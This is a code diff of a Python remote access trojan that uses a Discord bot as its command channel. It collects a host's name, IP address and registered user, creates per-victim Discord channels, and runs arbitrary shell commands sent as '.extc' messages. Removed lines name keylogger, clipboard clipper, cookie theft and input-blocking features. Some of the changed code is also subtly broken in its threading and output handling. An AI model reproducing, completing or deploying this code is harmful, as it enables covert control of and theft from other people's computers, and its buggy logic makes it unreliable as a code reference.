@@ -21,10 +21,15 @@ intents = discord.Intents.default()
 intents.guilds = True
 intents.guild_messages = True
 c = wmi.WMI()
+hostname = socket.gethostname()
 client = discord.Client(intents=discord.Intents.all())
+# Create the dictionary
+channel_ids = {
+    "info": "Initial info value",
+    "main": "Initial main value"
+}
 
 def get_system_info():
-    hostname = socket.gethostname()
     try:
         local_ip_address = socket.gethostbyname(hostname)
     except socket.gaierror:
@@ -72,68 +77,52 @@ def get_system_info():
         f"**Registered User:** {registered_user}"
     )
     return hostname, info
-def execute_command(command, channel):
-    try:
-        # Execute the command and capture the output
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        output = result.stdout if result.stdout else result.stderr
-        if output == "":
-            output = "No output or command not found."
-    except Exception as e:
-        output = f"Error executing command: {str(e)}"
-
-    # Send the output back to the Discord channel
-    client.loop.create_task(channel.send(f"```{output}```"))
+def execute_command(command):
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    output = result.stdout
+    return output
 @client.event
 async def on_ready():
     print(f"{client.user} has connected to Discord!")
     guild = discord.utils.get(client.guilds, id=GUILD_ID)
-
     if not guild:
         print(f"Could not find guild with ID {GUILD_ID}. Make sure the bot is added to the server.")
         return
-
     print("Getting system info")
-    # Get system info
     hostname, system_info = get_system_info()
-
-    # Check if category exists, else create it
     category = discord.utils.get(guild.categories, name=hostname)
-    print("Creating category.")
-    if not category:
-        category = await guild.create_category(name=hostname)
-        print(f"Created new category: {hostname}")
-
-    # Create a channel under the new category for system info
     info_channel_name = f"{hostname}-info"
     info_channel = discord.utils.get(category.channels, name=info_channel_name)
-    if not info_channel:
+    if not category:
+        category = await guild.create_category(name=hostname)
+    hostname = hostname.lower()
+    if f"{hostname}-info" not in category.channels:
         info_channel = await category.create_text_channel(name=info_channel_name)
-        print(f"Created new channel: {info_channel_name}")
-
-    # Send system information to the channel
+    info_channel_id = info_channel.id
+    channel_ids["info"] = info_channel_id
     await info_channel.send(system_info)
-
-    # Create a channel under the new category for commands
     commands_channel_name = f"{hostname}-commands"
+    commands_channel_name = commands_channel_name.lower()
     commands_channel = discord.utils.get(category.channels, name=commands_channel_name)
-    if not commands_channel:
+    if f"{hostname}-commands" not in category.channels:
         commands_channel = await category.create_text_channel(name=commands_channel_name)
-        print(f"Created new channel: {commands_channel_name}")
+        commands_channel_id = commands_channel.id
+        channel_ids['main'] = commands_channel_id
     else:
         print(f"Command channel already exists: {commands_channel_name}")
 @client.event
 async def on_message(message):
-    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, clipper_stop, input_blocked, custom_message_to_send, turned_off
-    # .log New message logged
     if message.author != client.user:
         if message.content == f'<@{client.user.id}>':
-            await client.get_channel(channel_ids['main']).send(f'<@{message.author.id}>')
+            await client.get_channel(channel_ids[f'main']).send(f'<@{message.author.id}>')
         if message.channel.id in channel_ids.values():
-            if message.content == '.exet':
-                await message.delete()
-                print(message)
-                print(message.content)
-
+            if ".extc" in message.content:
+                words = message.content.split()
+                result_string = ' '.join([word for word in words if word != ".extc"])
+                print(result_string)
+                extc = threading.Thread(target=execute_command, args=result_string)
+                mate = extc.start()
+                od = client.get_channel(message.channel.id)
+                await od.send(mate)
 
 client.run(BOT_TOKEN)
